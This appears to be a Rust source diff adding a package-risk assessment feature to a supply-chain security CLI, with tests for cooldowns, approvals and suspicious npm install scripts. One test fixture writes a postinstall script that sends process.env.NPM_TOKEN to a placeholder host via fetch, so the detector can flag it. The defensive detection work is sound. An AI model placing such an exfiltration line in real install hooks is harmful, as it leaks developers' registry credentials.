+    if let Some((name, _)) = value.split_once(" @ ") {
+        return normalize_package_name(name);
+    }
+    value
+        .rsplit(['/', ':'])
+        .next()
+        .unwrap_or("direct-package")
+        .trim_end_matches(".git")
+        .trim_end_matches(".tar.gz")
+        .trim_end_matches(".zip")
+        .replace('_', "-")
+        .to_ascii_lowercase()
+}
+
+fn npm_spec_source_kind(spec: &str) -> String {
+    let lowered = spec.to_ascii_lowercase();
+    if lowered.starts_with("git+") || lowered.contains("github:") {
+        "vcs".to_string()
+    } else if lowered.starts_with("http://") || lowered.starts_with("https://") {
+        "direct_url".to_string()
+    } else if lowered.starts_with("file:")
+        || lowered.starts_with("../")
+        || lowered.starts_with("./")
+    {
+        "local".to_string()
+    } else {
+        "registry".to_string()
+    }
+}
+
+fn python_spec_source_kind(spec: &str) -> String {
+    let lowered = spec.to_ascii_lowercase();
+    if lowered == "editable" {
+        "editable".to_string()
+    } else if lowered.starts_with("git+") {
+        "vcs".to_string()
+    } else if lowered.contains("://") {
+        "direct_url".to_string()
+    } else if lowered.starts_with("./") || lowered.starts_with("../") || lowered.starts_with('/') {
+        "local".to_string()
+    } else {
+        "registry".to_string()
+    }
+}
+
+fn package_class_for_source_kind(ecosystem: &str, source_kind: &str) -> PackageClass {
+    if matches!(source_kind, "direct_url" | "vcs" | "editable" | "local") {
+        return PackageClass::DirectVcsEditable;
+    }
+    match ecosystem {
+        "npm" => PackageClass::NpmRegistryTarball,
+        "pypi" | "uv" => PackageClass::PypiPureWheel,
+        _ => PackageClass::UnsupportedUnknown,
+    }
+}
+
+fn npm_spec_is_exact(spec: &str) -> bool {
+    let trimmed = spec.trim();
+    !trimmed.is_empty()
+        && !trimmed.starts_with('^')
+        && !trimmed.starts_with('~')
+        && !trimmed.starts_with('*')
+        && !trimmed.starts_with('>')
+        && !trimmed.starts_with('<')
+        && !trimmed.contains(" - ")
+        && npm_spec_source_kind(trimmed) == "registry"
+}
+
+fn python_spec_is_exact(spec: &str) -> bool {
+    spec.starts_with("==") && python_spec_source_kind(spec) == "registry"
+}
+
+fn package_risk_artifact_hash(
+    ecosystem: &str,
+    subject: &str,
+    contents: &str,
+    indicators: &[String],
+) -> String {
+    sha256_digest(
+        format!(
+            "{ecosystem}\n{subject}\n{}\n{}",
+            sha256_digest(contents.as_bytes()),
+            indicators.join(",")
+        )
+        .as_bytes(),
+    )
+}
+
+fn publish_age_days_from_unix(published_at: u64) -> Option<u64> {
+    let now = current_unix_seconds();
+    if published_at > now {
+        Some(0)
+    } else {
+        Some((now - published_at) / 86_400)
+    }
+}
+
+fn marker_value_u64(text: &str, key: &str) -> Option<u64> {
+    for part in text.split_whitespace() {
+        if let Some(value) = part.strip_prefix(&format!("{key}=")) {
+            return value.parse().ok();
+        }
+    }
+    None
+}
+
+fn toml_like_string_field(contents: &str, key: &str) -> Option<String> {
+    for line in contents.lines() {
+        let trimmed = line.trim();
+        if trimmed.starts_with(&format!("{key} ")) || trimmed.starts_with(&format!("{key}=")) {
+            let (_, value) = trimmed.split_once('=')?;
+            return Some(
+                value
+                    .trim()
+                    .trim_matches('"')
+                    .trim_matches('\'')
+                    .to_string(),
+            );
+        }
+    }
+    None
+}
+
+fn toml_like_u64_field(contents: &str, key: &str) -> Option<u64> {
+    for line in contents.lines() {
+        let trimmed = line.trim();
+        if trimmed.starts_with(&format!("{key} ")) || trimmed.starts_with(&format!("{key}=")) {
+            let (_, value) = trimmed.split_once('=')?;
+            return value.trim().trim_matches('"').parse().ok();
+        }
+    }
+    None
+}
+
+fn json_extract_u64_field(input: &str, field: &str) -> Option<u64> {
+    let value = json_field_value(input, field)?.trim_start();
+    let end = value
+        .char_indices()
+        .take_while(|(_, character)| character.is_ascii_digit())
+        .map(|(index, character)| index + character.len_utf8())
+        .last()
+        .unwrap_or(0);
+    if end == 0 {
+        return None;
+    }
+    value[..end].parse().ok()
+}
+
+fn json_extract_object_string_pairs(input: &str, field: &str) -> Vec<(String, String)> {
+    let Some(value) = json_field_value(input, field).map(str::trim_start) else {
+        return Vec::new();
+    };
+    if !value.starts_with('{') {
+        return Vec::new();
+    }
+    let Some(object) = extract_balanced_json(value, '{', '}') else {
+        return Vec::new();
+    };
+    let mut pairs = Vec::new();
+    let mut rest = object.trim_start_matches('{').trim_end_matches('}').trim();
+    while !rest.is_empty() {
+        let Some((key, after_key)) = json_parse_leading_string(rest) else {
+            break;
+        };
+        let after_key = after_key.trim_start();
+        if !after_key.starts_with(':') {
+            break;
+        }
+        let after_colon = after_key[1..].trim_start();
+        let Some((value, after_value)) = json_parse_leading_string(after_colon) else {
+            break;
+        };
+        pairs.push((key, value));
+        rest = after_value.trim_start();
+        if rest.starts_with(',') {
+            rest = rest[1..].trim_start();
+        } else {
+            break;
+        }
+    }
+    pairs
+}
+
+fn json_extract_object_array(input: &str, field: &str) -> Vec<String> {
+    let Some(value) = json_field_value(input, field).map(str::trim_start) else {
+        return Vec::new();
+    };
+    if !value.starts_with('[') {
+        return Vec::new();
+    }
+    let Some(array) = extract_balanced_json(value, '[', ']') else {
+        return Vec::new();
+    };
+    let mut objects = Vec::new();
+    let mut rest = array.trim_start_matches('[').trim_end_matches(']').trim();
+    while !rest.is_empty() {
+        if !rest.starts_with('{') {
+            break;
+        }
+        let Some(object) = extract_balanced_json(rest, '{', '}') else {
+            break;
+        };
+        objects.push(object.to_string());
+        rest = rest[object.len()..].trim_start();
+        if rest.starts_with(',') {
+            rest = rest[1..].trim_start();
+        } else {
+            break;
+        }
+    }
+    objects
+}
+
+fn extract_balanced_json(input: &str, open: char, close: char) -> Option<&str> {
+    let mut depth = 0usize;
+    let mut in_string = false;
+    let mut escaped = false;
+    let mut started = false;
+    for (index, character) in input.char_indices() {
+        if in_string {
+            if escaped {
+                escaped = false;
+            } else if character == '\\' {
+                escaped = true;
+            } else if character == '"' {
+                in_string = false;
+            }
+            continue;
+        }
+        if character == '"' {
+            in_string = true;
+            continue;
+        }
+        if character == open {
+            started = true;
+            depth += 1;
+        } else if character == close {
+            depth = depth.saturating_sub(1);
+            if started && depth == 0 {
+                return Some(&input[..index + character.len_utf8()]);
+            }
+        }
+    }
+    None
+}
+
+fn package_risk_state_dir(state_dir: &Path) -> PathBuf {
+    state_dir.join("package-risk")
+}
+
+fn package_risk_store_path(state_dir: &Path) -> PathBuf {
+    package_risk_state_dir(state_dir).join("package-risk-evidence.jsonl")
+}
+
+fn package_risk_receipts_dir(state_dir: &Path) -> PathBuf {
+    package_risk_state_dir(state_dir).join("receipts")
+}
+
+fn package_risk_receipt_path(state_dir: &Path, receipt_id: &str) -> PathBuf {
+    package_risk_receipts_dir(state_dir).join(format!("{receipt_id}.json"))
+}
+
+fn package_risk_receipt_id(path: &Path, now: u64) -> String {
+    let digest = sha256_digest(format!("{}:{now}", path.display()).as_bytes());
+    format!("pkg-risk-{now}-{}", &digest[..12])
+}
+
+fn package_risk_memory_ready(state_dir: &Path) -> bool {
+    package_risk_store_path(state_dir).is_file()
+}
+
+struct PackageRiskReceiptWrite<'a> {
+    path: &'a Path,
+    receipt_id: &'a str,
+    requested_ecosystem: PackageRiskEcosystem,
+    assessments: &'a [PackageRiskAssessment],
+    all_freshness_allowed: bool,
+    all_diff_clean_or_baseline_absent: bool,
+    overall_verdict: PackageRiskVerdict,
+    reason_codes: &'a [String],
+}
+
+fn write_package_risk_receipt(write: PackageRiskReceiptWrite<'_>) -> String {
+    let Some(parent) = write.path.parent() else {
+        return "error:package_risk_receipt_parent_missing".to_string();
+    };
+    if std::fs::create_dir_all(parent).is_err() {
+        return "error:package_risk_receipt_dir_failed".to_string();
+    }
+    let packages = write
+        .assessments
+        .iter()
+        .map(render_package_risk_package_json)
+        .collect::<Vec<_>>()
+        .join(", ");
+    let contents = format!(
+        "{{\n  \"schema_version\": {},\n  \"receipt_id\": {},\n  \"created_at_unix_seconds\": {},\n  \"requested_ecosystem\": {},\n  \"cooldown_days\": {},\n  \"overall_verdict\": {},\n  \"all_freshness_allowed\": {},\n  \"all_diff_clean_or_baseline_absent\": {},\n  \"reason_codes\": {},\n  \"packages\": [{}]\n}}\n",
+        json_string(PACKAGE_RISK_ASSESSMENT_SCHEMA),
+        json_string(write.receipt_id),
+        current_unix_seconds(),
+        json_string(write.requested_ecosystem.as_str()),
+        PACKAGE_RISK_COOLDOWN_DAYS,
+        json_string(write.overall_verdict.as_str()),
+        write.all_freshness_allowed,
+        write.all_diff_clean_or_baseline_absent,
+        json_string_array(write.reason_codes),
+        packages
+    );
+    match std::fs::write(write.path, contents.as_bytes()) {
+        Ok(()) => "ok".to_string(),
+        Err(error) => format!("error:{error}"),
+    }
+}
+
+fn package_risk_assessment_store_record(
+    assessment: &PackageRiskAssessment,
+    receipt_id: &str,
+    approved: bool,
+) -> PackageRiskMemoryRecord {
+    PackageRiskMemoryRecord {
+        record_kind: if approved { "approval" } else { "assessment" }.to_string(),
+        ecosystem: assessment.ecosystem,
+        package_name: assessment.package_name.clone(),
+        requested_spec: assessment.requested_spec.clone(),
+        resolved_version: assessment.resolved_version.clone(),
+        selected_version: assessment.selected_version.clone(),
+        source_kind: assessment.source_kind.clone(),
+        package_class: assessment.package_class.as_str().to_string(),
+        artifact_hash: assessment.artifact_hash.clone(),
+        verdict: assessment.verdict.as_str().to_string(),
+        approved,
+        created_at_unix_seconds: current_unix_seconds(),
+        receipt_id: receipt_id.to_string(),
+        reason_codes: assessment.reason_codes.clone(),
+        diff_clean_or_baseline_absent: assessment.diff_clean_or_baseline_absent,
+        freshness_allowed: assessment.freshness_allowed,
+    }
+}
+
+fn package_risk_approval_record_from_receipt_object(
+    object: &str,
+    receipt_id: &str,
+    reason: &str,
+    now: u64,
+) -> Option<PackageRiskMemoryRecord> {
+    let ecosystem = PackageRiskEcosystem::parse(&json_extract_string_field(object, "ecosystem")?)?;
+    let mut reason_codes = json_extract_string_array_field(object, "reason_codes");
+    reason_codes.push(format!(
+        "manual_approval_reason_sha256:{}",
+        sha256_digest(reason.as_bytes())
+    ));
+    reason_codes.sort();
+    reason_codes.dedup();
+    Some(PackageRiskMemoryRecord {
+        record_kind: "approval".to_string(),
+        ecosystem,
+        package_name: json_extract_string_field(object, "package_name")?,
+        requested_spec: json_extract_string_field(object, "requested_spec")?,
+        resolved_version: json_extract_string_field(object, "resolved_version"),
+        selected_version: json_extract_string_field(object, "selected_version"),
+        source_kind: json_extract_string_field(object, "source_kind")?,
+        package_class: json_extract_string_field(object, "package_class")?,
+        artifact_hash: json_extract_string_field(object, "artifact_hash")?,
+        verdict: json_extract_string_field(object, "verdict")?,
+        approved: true,
+        created_at_unix_seconds: now,
+        receipt_id: receipt_id.to_string(),
+        reason_codes,
+        diff_clean_or_baseline_absent: json_extract_bool_field(
+            object,
+            "diff_clean_or_baseline_absent",
+        )
+        .unwrap_or(false),
+        freshness_allowed: json_extract_bool_field(object, "freshness_allowed").unwrap_or(false),
+    })
+}
+
+fn append_package_risk_store_record(
+    state_dir: &Path,
+    record: &PackageRiskMemoryRecord,
+) -> std::io::Result<()> {
+    let path = package_risk_store_path(state_dir);
+    if let Some(parent) = path.parent() {
+        std::fs::create_dir_all(parent)?;
+    }
+    let mut file = std::fs::OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(path)?;
+    writeln!(file, "{}", render_package_risk_memory_record_json(record))
+}
+
+fn load_package_risk_memory(state_dir: &Path) -> Vec<PackageRiskMemoryRecord> {
+    let path = package_risk_store_path(state_dir);
+    let Ok(contents) = std::fs::read_to_string(path) else {
+        return Vec::new();
+    };
+    contents
+        .lines()
+        .filter_map(parse_package_risk_memory_record)
+        .collect()
+}
+
+fn parse_package_risk_memory_record(line: &str) -> Option<PackageRiskMemoryRecord> {
+    Some(PackageRiskMemoryRecord {
+        record_kind: json_extract_string_field(line, "record_kind")?,
+        ecosystem: PackageRiskEcosystem::parse(&json_extract_string_field(line, "ecosystem")?)?,
+        package_name: json_extract_string_field(line, "package_name")?,
+        requested_spec: json_extract_string_field(line, "requested_spec")?,
+        resolved_version: json_extract_string_field(line, "resolved_version"),
+        selected_version: json_extract_string_field(line, "selected_version"),
+        source_kind: json_extract_string_field(line, "source_kind")?,
+        package_class: json_extract_string_field(line, "package_class")?,
+        artifact_hash: json_extract_string_field(line, "artifact_hash")?,
+        verdict: json_extract_string_field(line, "verdict")?,
+        approved: json_extract_bool_field(line, "approved").unwrap_or(false),
+        created_at_unix_seconds: json_extract_u64_field(line, "created_at_unix_seconds")?,
+        receipt_id: json_extract_string_field(line, "receipt_id")?,
+        reason_codes: json_extract_string_array_field(line, "reason_codes"),
+        diff_clean_or_baseline_absent: json_extract_bool_field(
+            line,
+            "diff_clean_or_baseline_absent",
+        )
+        .unwrap_or(false),
+        freshness_allowed: json_extract_bool_field(line, "freshness_allowed").unwrap_or(false),
+    })
+}
+
+fn render_package_risk_memory_record_json(record: &PackageRiskMemoryRecord) -> String {
+    format!(
+        "{{\"schema_version\": {}, \"record_kind\": {}, \"ecosystem\": {}, \"package_name\": {}, \"requested_spec\": {}, \"resolved_version\": {}, \"selected_version\": {}, \"source_kind\": {}, \"package_class\": {}, \"artifact_hash\": {}, \"verdict\": {}, \"approved\": {}, \"created_at_unix_seconds\": {}, \"receipt_id\": {}, \"reason_codes\": {}, \"diff_clean_or_baseline_absent\": {}, \"freshness_allowed\": {}}}",
+        json_string(PACKAGE_RISK_STORE_SCHEMA),
+        json_string(&record.record_kind),
+        json_string(record.ecosystem.as_str()),
+        json_string(&record.package_name),
+        json_string(&record.requested_spec),
+        json_option_string(record.resolved_version.as_deref()),
+        json_option_string(record.selected_version.as_deref()),
+        json_string(&record.source_kind),
+        json_string(&record.package_class),
+        json_string(&record.artifact_hash),
+        json_string(&record.verdict),
+        record.approved,
+        record.created_at_unix_seconds,
+        json_string(&record.receipt_id),
+        json_string_array(&record.reason_codes),
+        record.diff_clean_or_baseline_absent,
+        record.freshness_allowed
+    )
+}
+
+fn render_package_risk_memory_record_text(record: &PackageRiskMemoryRecord) -> String {
+    format!(
+        "package_risk_record kind={} ecosystem={} package={} requested_spec={} selected_version={} approved={} verdict={} artifact_hash={} receipt_id={} diff_clean_or_baseline_absent={} freshness_allowed={} reason_codes={:?}",
+        record.record_kind,
+        record.ecosystem.as_str(),
+        record.package_name,
+        redacted_scalar(&record.requested_spec),
+        record.selected_version.as_deref().unwrap_or("none"),
+        record.approved,
+        record.verdict,
+        record.artifact_hash,
+        record.receipt_id,
+        record.diff_clean_or_baseline_absent,
+        record.freshness_allowed,
+        record.reason_codes
+    )
+}
+
+fn redacted_package_risk_path(path: &Path) -> String {
+    let value = path.display().to_string();
+    if value.contains("/Users/") {
+        "<redacted-package-risk-path>".to_string()
+    } else {
+        value
+    }
+}
+
+fn current_unix_seconds() -> u64 {
+    SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .map(|duration| duration.as_secs())
+        .unwrap_or(0)
 }
 
 fn render_evidence_profiles() -> String {
@@ -14780,6 +16582,7 @@ exit 0
             native_marker: false,
             editable: false,
             evidence: LocalEvidenceFlags::clean(true),
+            package_risk_receipt: None,
             json: false,
         });
         assert_eq!(result.exit_code, 0);
@@ -14801,6 +16604,7 @@ exit 0
             native_marker: false,
             editable: false,
             evidence: LocalEvidenceFlags::clean(true),
+            package_risk_receipt: None,
             json: false,
         });
         assert_eq!(binary.exit_code, 22);
@@ -14819,6 +16623,7 @@ exit 0
             native_marker: false,
             editable: false,
             evidence: LocalEvidenceFlags::clean(true),
+            package_risk_receipt: None,
             json: false,
         });
         assert_eq!(direct.exit_code, 20);
@@ -14840,6 +16645,7 @@ exit 0
             native_marker: false,
             editable: false,
             evidence: LocalEvidenceFlags::clean(true),
+            package_risk_receipt: None,
             json: true,
         });
         assert_eq!(result.exit_code, 0);
@@ -14847,6 +16653,211 @@ exit 0
             .output
             .contains("\"package_class\": \"pypi.pure_wheel.v1\""));
         assert!(result.output.contains("\"verdict\": \"auto_sync\""));
+    }
+
+    #[test]
+    fn package_risk_assess_approves_and_reuses_last_known_good_for_unpinned_python() {
+        let root = temp_root("whoathere-cli-package-risk-lkg");
+        let state_dir = root.join("state");
+        let pinned = root.join("pinned");
+        std::fs::create_dir_all(&pinned).expect("pinned");
+        write_new_file(
+            &pinned.join("requirements.txt"),
+            b"safe-pkg==1.2.3 # whoathere-published-at=1700000000\n",
+        )
+        .expect("requirements");
+
+        let assessed = evaluate_command(Command::PackageRiskAssess {
+            workspace: Some(pinned.display().to_string()),
+            ecosystem: Some("pypi".to_string()),
+            state_dir: Some(state_dir.display().to_string()),
+            json: true,
+        });
+        assert_eq!(assessed.exit_code, 0);
+        assert!(assessed
+            .output
+            .contains("\"overall_verdict\": \"auto_sync_candidate\""));
+        assert!(assessed.output.contains("\"all_freshness_allowed\": true"));
+        assert!(!assessed.output.contains("WHOATHERE_CANARY_TOKEN"));
+
+        let receipt = single_package_risk_receipt(&state_dir);
+        let approved = evaluate_command(Command::PackageRiskApprove {
+            receipt: Some(receipt.display().to_string()),
+            reason: Some("local beta baseline".to_string()),
+            state_dir: Some(state_dir.display().to_string()),
+            json: true,
+        });
+        assert_eq!(approved.exit_code, 0);
+        assert!(approved.output.contains("\"approved_count\": 1"));
+
+        let unpinned = root.join("unpinned");
+        std::fs::create_dir_all(&unpinned).expect("unpinned");
+        write_new_file(&unpinned.join("requirements.txt"), b"safe-pkg>=1.0\n")
+            .expect("requirements");
+        let assessed_unpinned = evaluate_command(Command::PackageRiskAssess {
+            workspace: Some(unpinned.display().to_string()),
+            ecosystem: Some("pypi".to_string()),
+            state_dir: Some(state_dir.display().to_string()),
+            json: true,
+        });
+        assert_eq!(assessed_unpinned.exit_code, 0);
+        assert!(assessed_unpinned
+            .output
+            .contains("last_known_good_substitution_selected"));
+        assert!(assessed_unpinned
+            .output
+            .contains("\"selected_version\": \"1.2.3\""));
+
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn package_risk_blocks_fresh_unpinned_and_hard_package_classes() {
+        let root = temp_root("whoathere-cli-package-risk-blocks");
+        let state_dir = root.join("state");
+        let fresh = root.join("fresh");
+        std::fs::create_dir_all(&fresh).expect("fresh");
+        write_new_file(
+            &fresh.join("requirements.txt"),
+            format!(
+                "fresh-pkg==2.0.0 # whoathere-published-at={}\n",
+                current_unix_seconds()
+            )
+            .as_bytes(),
+        )
+        .expect("requirements");
+        let fresh_result = evaluate_command(Command::PackageRiskAssess {
+            workspace: Some(fresh.display().to_string()),
+            ecosystem: Some("pypi".to_string()),
+            state_dir: Some(state_dir.display().to_string()),
+            json: true,
+        });
+        assert_eq!(fresh_result.exit_code, 22);
+        assert!(fresh_result
+            .output
+            .contains("fresh_release_cooldown_active"));
+
+        let unpinned = root.join("unpinned-no-lkg");
+        std::fs::create_dir_all(&unpinned).expect("unpinned");
+        write_new_file(&unpinned.join("requirements.txt"), b"unknown-pkg>=1.0\n")
+            .expect("requirements");
+        let unpinned_result = evaluate_command(Command::PackageRiskAssess {
+            workspace: Some(unpinned.display().to_string()),
+            ecosystem: Some("pypi".to_string()),
+            state_dir: Some(state_dir.display().to_string()),
+            json: true,
+        });
+        assert_eq!(unpinned_result.exit_code, 22);
+        assert!(unpinned_result
+            .output
+            .contains("unpinned_no_last_known_good"));
+
+        let direct = root.join("direct");
+        std::fs::create_dir_all(&direct).expect("direct");
+        write_new_file(
+            &direct.join("requirements.txt"),
+            b"evil @ git+https://example.invalid/evil.git\n",
+        )
+        .expect("requirements");
+        let direct_result = evaluate_command(Command::PackageRiskAssess {
+            workspace: Some(direct.display().to_string()),
+            ecosystem: Some("pypi".to_string()),
+            state_dir: Some(state_dir.display().to_string()),
+            json: true,
+        });
+        assert_eq!(direct_result.exit_code, 20);
+        assert!(direct_result
+            .output
+            .contains("direct_vcs_editable_denied_by_default"));
+
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn package_risk_detects_suspicious_npm_diff_signals_without_raw_secrets() {
+        let root = temp_root("whoathere-cli-package-risk-npm-suspicious");
+        let state_dir = root.join("state");
+        write_new_file(
+            &root.join("package.json"),
+            br#"{
+  "name": "compromised-maintainer-fixture",
+  "version": "1.0.0",
+  "whoatherePublishedAtUnixSeconds": 1700000000,
+  "scripts": {"postinstall": "node postinstall.js"},
+  "repository": "https://example.invalid/repo"
+}
+"#,
+        )
+        .expect("package json");
+        write_new_file(
+            &root.join("postinstall.js"),
+            b"fetch('https://example.invalid/collect?token=' + process.env.NPM_TOKEN)\n",
+        )
+        .expect("postinstall");
+
+        let result = evaluate_command(Command::PackageRiskAssess {
+            workspace: Some(root.display().to_string()),
+            ecosystem: Some("npm".to_string()),
+            state_dir: Some(state_dir.display().to_string()),
+            json: true,
+        });
+
+        assert_eq!(result.exit_code, 22);
+        assert!(result.output.contains("npm_lifecycle_script_postinstall"));
+        assert!(result.output.contains("credential_or_environment_access"));
+        assert!(result.output.contains("network_capability_observed"));
+        assert!(!result.output.contains("NPM_TOKEN_VALUE"));
+        assert!(!result.output.contains("/Users/"));
+
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn vm_release_plan_applies_package_risk_receipt_for_diff_and_freshness() {
+        let root = temp_root("whoathere-cli-package-risk-release-plan");
+        let state_dir = root.join("state");
+        let workspace = root.join("workspace");
+        std::fs::create_dir_all(&workspace).expect("workspace");
+        write_new_file(
+            &workspace.join("requirements.txt"),
+            b"safe-pkg==1.2.3 # whoathere-published-at=1700000000\n",
+        )
+        .expect("requirements");
+        let assessed = evaluate_command(Command::PackageRiskAssess {
+            workspace: Some(workspace.display().to_string()),
+            ecosystem: Some("pypi".to_string()),
+            state_dir: Some(state_dir.display().to_string()),
+            json: true,
+        });
+        assert_eq!(assessed.exit_code, 0);
+        let receipt = single_package_risk_receipt(&state_dir);
+        let mut evidence = LocalEvidenceFlags::clean(true);
+        evidence.diff_clean_or_baseline_absent = false;
+        evidence.freshness_allowed = false;
+        let result = evaluate_command(Command::VmReleasePlan {
+            artifact_class: Some("pypi.pure_wheel.v1".to_string()),
+            ecosystem: None,
+            source: None,
+            filename: None,
+            lifecycle_script: false,
+            pep517_backend: false,
+            native_marker: false,
+            editable: false,
+            evidence,
+            package_risk_receipt: Some(receipt.display().to_string()),
+            json: true,
+        });
+        assert_eq!(result.exit_code, 0);
+        assert!(result
+            .output
+            .contains("\"package_risk_receipt_applied\": true"));
+        assert!(result
+            .output
+            .contains("\"diff_clean_or_baseline_absent\": true"));
+        assert!(result.output.contains("\"freshness_allowed\": true"));
+        assert!(result.output.contains("\"verdict\": \"auto_sync\""));
+
+        let _ = std::fs::remove_dir_all(&root);
     }
 
     #[test]
@@ -14870,6 +16881,9 @@ exit 0
             "deny_default_classes=[\"direct_vcs_editable.v1\", \"unsupported_unknown.v1\"]"
         ));
         assert!(sync.output.contains("scanner_adapter=guarddog"));
+        assert!(sync
+            .output
+            .contains("package_risk_required_for_public_auto_sync=true"));
     }
 
     #[test]
@@ -18434,6 +20448,19 @@ exit 0
         let _ = std::fs::remove_dir_all(&root);
         std::fs::create_dir_all(&root).expect("create temp root");
         root
+    }
+
+    fn single_package_risk_receipt(state_dir: &std::path::Path) -> std::path::PathBuf {
+        let receipts_dir = state_dir.join("package-risk").join("receipts");
+        let mut receipts = std::fs::read_dir(&receipts_dir)
+            .expect("receipts dir")
+            .flatten()
+            .map(|entry| entry.path())
+            .filter(|path| path.extension().and_then(|ext| ext.to_str()) == Some("json"))
+            .collect::<Vec<_>>();
+        receipts.sort();
+        assert_eq!(receipts.len(), 1);
+        receipts.remove(0)
     }
 
     fn write_complete_guest_provisioning_receipt(state_dir: &std::path::Path) {
